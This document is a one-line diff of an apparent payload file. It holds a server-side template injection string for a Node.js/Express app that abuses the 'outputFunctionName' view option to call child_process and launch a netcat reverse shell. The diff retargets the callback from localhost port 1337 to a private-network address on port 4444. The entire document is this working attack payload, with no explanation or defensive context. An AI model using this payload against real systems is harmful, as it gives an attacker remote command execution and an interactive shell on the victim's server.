@@ -1,1 +1,1 @@
-&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
+&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc 192.168.134.88 4444 -e sh');s
